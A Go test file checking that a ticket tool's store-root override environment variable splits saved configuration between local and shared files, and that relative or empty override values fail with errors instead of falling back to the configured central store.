func TestStoreRootOverrideSaveSplitsLocalAndShared(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	override := t.TempDir()
	t.Setenv(StoreRootEnv, override)

	cfg := Config{
		Projects: map[string]ProjectConfig{
			"sandbox": {Path: "/repo/sandbox", Store: "central", RegisteredAt: "2026-01-01T00:00:00Z"},
		},
	}
	if err := Save(cfg); err != nil {
		t.Fatalf("Save: %v", err)
	}

	local, err := loadFile(filepath.Join(override, configDirName, configFileName))
	if err != nil {
		t.Fatalf("loadFile local: %v", err)
	}
	if p := local.Projects["sandbox"]; p.Store != "" || p.RegisteredAt != "" {
		t.Errorf("local project = %+v, want the shared-owned fields left to the shared config", p)
	}
	if p := local.Projects["sandbox"]; p.Path != "/repo/sandbox" {
		t.Errorf("local project path = %q, want /repo/sandbox", p.Path)
	}

	shared, err := loadFile(filepath.Join(override, configFileName))
	if err != nil {
		t.Fatalf("loadFile shared: %v", err)
	}
	if p := shared.Projects["sandbox"]; p.Store != "central" {
		t.Errorf("shared project = %+v, want store: central", p)
	}
}

func TestStoreRootOverrideConfiguresWithoutLocalConfig(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv(StoreRootEnv, t.TempDir())

	if !IsConfigured() {
		t.Error("IsConfigured should be true under the override with no local config")
	}
}

// TestStoreRootOverrideNonAbsoluteIsRefused covers both non-absolute values a
// harness produces: a relative path, and the empty string that `export
// TK_STORE_ROOT="$SANDBOX"` leaves behind when $SANDBOX expanded to nothing.
// The empty one is a set-but-unusable store root, not an absent variable —
// reading it as absent would resolve the configured central store, which is
// exactly the silent fall-back the override exists to prevent.
func TestStoreRootOverrideNonAbsoluteIsRefused(t *testing.T) {
	for _, tc := range []struct{ name, value string }{
		{"relative", "relative/store"},
		{"empty", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			home := t.TempDir()
			t.Setenv("HOME", home)

			configured := t.TempDir()
			cfg := Config{CentralRoot: configured, Projects: map[string]ProjectConfig{}}
			if err := Save(cfg); err != nil {
				t.Fatalf("Save: %v", err)
			}

			t.Setenv(StoreRootEnv, tc.value)

			root, err := CentralStoreRoot()
			if err == nil {
				t.Fatalf("CentralStoreRoot = %q, want an error for a non-absolute override", root)
			}
			if root != "" {
				t.Errorf("CentralStoreRoot = %q, want no fall-back to the configured store", root)
			}
			if !strings.Contains(err.Error(), StoreRootEnv) {
				t.Errorf("error %q should name %s", err, StoreRootEnv)
			}

			if _, err := ConfigPath(); err == nil {
				t.Error("ConfigPath should error rather than fall back to ~/.ticket/config.yaml")
			}
			if _, err := Load(); err == nil {
				t.Error("Load should error rather than resolve the configured store")
			}
			if err := Save(cfg); err == nil {
				t.Error("Save should error rather than write the configured store")
			}

			// The bool gate must not swallow the bad value into a run that then
			// resolves the real store: it reports configured, and CentralStoreRoot
			// above is what fails.
			if !IsConfigured() {
				t.Error("IsConfigured should report the override as set so the error surfaces")
			}
		})
	}
}
